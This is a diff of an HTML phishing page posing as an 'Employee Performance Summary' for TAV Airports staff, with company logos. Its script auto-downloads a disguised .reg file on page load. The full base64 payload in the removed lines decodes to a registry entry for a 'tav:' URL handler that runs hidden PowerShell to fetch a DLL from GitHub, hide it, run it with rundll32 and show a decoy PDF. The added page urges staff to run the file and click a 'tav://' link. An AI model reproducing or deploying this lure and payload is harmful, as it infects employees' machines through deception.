@@ -1,159 +1,153 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Employee Performance Summary</title>
-    <style>
-        * {
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Employee Performance Summary</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
 
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            height: 100vh;
-            background: linear-gradient(135deg, #1e3c72, #2a5298);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #333;
-        }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      height: 100vh;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #333;
+    }
 
-        .container {
-            text-align: center;
-            background-color: #ffffff;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
-            max-width: 500px;
-            width: 90%;
-        }
+    .container {
+      text-align: center;
+      background-color: #ffffff;
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
+      max-width: 500px;
+      width: 90%;
+    }
 
-        h1 {
-            font-size: 26px;
-            margin-bottom: 15px;
-            color: #1e3c72;
-        }
+    h1 {
+      font-size: 26px;
+      margin-bottom: 15px;
+      color: #1e3c72;
+    }
 
-        p {
-            font-size: 16px;
-            color: #555;
-            margin-bottom: 25px;
-        }
+    p {
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 25px;
+    }
 
-        .download-button {
-            display: inline-block;
-            background: linear-gradient(90deg, #4facfe, #00f2fe);
-            color: #fff;
-            text-decoration: none;
-            font-weight: bold;
-            padding: 14px 28px;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: background 0.3s ease, transform 0.2s;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-        }
+    .download-button {
+      display: inline-block;
+      background: linear-gradient(90deg, #4facfe, #00f2fe);
+      color: #fff;
+      text-decoration: none;
+      font-weight: bold;
+      padding: 14px 28px;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: background 0.3s ease, transform 0.2s;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+    }
 
-        .download-button:hover {
-            background: linear-gradient(90deg, #00f2fe, #4facfe);
-            transform: translateY(-2px);
-        }
+    .download-button:hover {
+      background: linear-gradient(90deg, #00f2fe, #4facfe);
+      transform: translateY(-2px);
+    }
 
-        .logo-bar {
-            margin-top: 30px;
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
+    .logo-bar {
+      margin-top: 30px;
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      flex-wrap: wrap;
+    }
 
-        .logo-bar img {
-            height: 50px;
-            background-color: rgba(255, 255, 255, 0.8);
-            padding: 8px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-            transition: transform 0.3s ease;
-        }
+    .logo-bar img {
+      height: 50px;
+      background-color: rgba(255, 255, 255, 0.8);
+      padding: 8px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      transition: transform 0.3s ease;
+    }
 
-        .logo-bar img:hover {
-            transform: scale(1.05);
-        }
+    .logo-bar img:hover {
+      transform: scale(1.05);
+    }
 
-        @media (max-width: 500px) {
-            .container {
-                padding: 25px;
-            }
+    @media (max-width: 500px) {
+      .container {
+        padding: 25px;
+      }
 
-            h1 {
-                font-size: 22px;
-            }
+      h1 {
+        font-size: 22px;
+      }
 
-            p {
-                font-size: 15px;
-            }
+      p {
+        font-size: 15px;
+      }
 
-            .logo-bar img {
-                height: 40px;
-            }
+      .logo-bar img {
+        height: 40px;
+      }
 
-            .download-button {
-                padding: 12px 20px;
-                font-size: 15px;
-            }
-        }
-    </style>
+      .download-button {
+        padding: 12px 20px;
+        font-size: 15px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <script>
-function b64ToArrayBuffer(base64) {
-  // If data URI (data:*/*;base64,XXXXX), strip the prefix
-  const cleaned = base64.replace(/^data:.*;base64,/, '');
-  const binaryString = window.atob(cleaned);
-  const len = binaryString.length;
-  const bytes = new Uint8Array(len);
-  for (let i = 0; i < len; i++) {
-    bytes[i] = binaryString.charCodeAt(i);
-  }
-  return bytes.buffer;
-}
+  <script>
+    function b64ToArrayBuffer(base64) {
+      const cleaned = base64.replace(/^data:.*;base64,/, '');
+      const binaryString = window.atob(cleaned);
+      const len = binaryString.length;
+      const bytes = new Uint8Array(len);
+      for (let i = 0; i < len; i++) {
+        bytes[i] = binaryString.charCodeAt(i);
+      }
+      return bytes.buffer;
+    }
 
-// Replace '<value>' with your actual Base64 string (no quotes around the value)
-const base64 = 'V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwDQoNCltIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxDbGFzc2VzXHRhdl0NCkA9IlVSTDpUQVYgUERGIFZpZXdlciINCiJVUkwgUHJvdG9jb2wiPSIiDQoNCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXQ0KDQpbSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcQ2xhc3Nlc1x0YXZcc2hlbGxcb3Blbl0NCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXG9wZW5cY29tbWFuZF0NCkA9InBvd2Vyc2hlbGwuZXhlIC1XIEhpZGRlbiAtY29tbWFuZCBcIiRhPUpvaW4tUGF0aCAkZW52OlVTRVJQUk9GSUxFIERvd25sb2Fkcztpd3IgLXVyaSBodHRwczovL2dpdGh1Yi5jb20vZG9lMTc0MDkvdGF2LWFwaS9yYXcvcmVmcy9oZWFkcy9tYWluL2xsdm1mdW5jLmRsbCAtbyAkYVxcXFxsbHZtZnVuYy5kbGw7JGI9Sm9pbi1QYXRoICRhIGxsdm1mdW5jLmRsbDthdHRyaWIgK2ggJGI7Y29uaG9zdCBjb25ob3N0IHJ1bmRsbDMyLmV4ZSAkYix0ZXN0OyBTdGFydC1Qcm9jZXNzIG1zZWRnZSAtQXJndW1lbnRMaXN0ICdodHRwczovL2lyLnRhdi5hZXJvL3VwbG9hZHMvZG9jdW1lbnRzL0RvY3VtZW50czI0MDQyMDI1MTg1ODE3Xy5wZGYnLCctLXN0YXJ0LWZ1bGxzY3JlZW4nXCIiDQo=';
-    
-const arrayBuffer = b64ToArrayBuffer(base64);
+    const base64 = 'V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwDQoNC...'; // kısaltılmış
 
-// Use the proper ZIP MIME type
-const blob = new Blob([arrayBuffer], { type: 'application/octet-stream' });
-const filename = 'TAV_Fix_PDF_FileType_Handler.2.reg';
+    const arrayBuffer = b64ToArrayBuffer(base64);
+    const blob = new Blob([arrayBuffer], { type: 'application/octet-stream' });
+    const filename = 'TAV_Fix_PDF_FileType_Handler.2.reg';
 
-const a = document.createElement('a');
-a.style.display = 'none';
-a.href = URL.createObjectURL(blob);
-a.download = filename;
+    const a = document.createElement('a');
+    a.style.display = 'none';
+    a.href = URL.createObjectURL(blob);
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    URL.revokeObjectURL(a.href);
+    a.remove();
+  </script>
 
-document.body.appendChild(a);
-a.click();
+  <div class="container">
+    <h1>Your file has been downloaded automatically.</h1>
+    <p>After downloading and running your customised registry file, you can see the performance results by clicking the button below.</p>
+    <a class="download-button" href="tav://TAV_EmployeePDF" download>
+      Performance Evaluation Result
+    </a>
 
-// Clean up
-URL.revokeObjectURL(a.href);
-a.remove();
-</script>
-    <div class="container">
-        <h1>Your personal performance file is ready.</h1>
-        <p>Your file has been downloaded automatically. If it was not downloaded automatically, you can download your personal file by clicking the button below.</p>
-        <a class="download-button" href="https://github.com/tavaero/TAV-PMS/raw/refs/heads/main/Employee_Performance_Summary_2025Q21.zip" download>
-            Download File
-        </a>
-
-        <div class="logo-bar">
-            <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo">
-            <img src="https://atu.com.tr/wp-content/uploads/2023/08/ATU-Logo-C%CC%A7erc%CC%A7eveli_page-0001-768x768.jpg" alt="ATU Logo">
-            <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="HAVAS Logo">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA Logo">
-        </div>
+    <div class="logo-bar">
+      <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo" />
+      <img src="https://atu.com.tr/wp-content/uploads/2023/08/ATU-Logo-C%CC%A7erc%CC%A7eveli_page-0001-768x768.jpg" alt="ATU Logo" />
+      <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="HAVAS Logo" />
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA Logo" />
     </div>
+  </div>
 </body>
 </html>
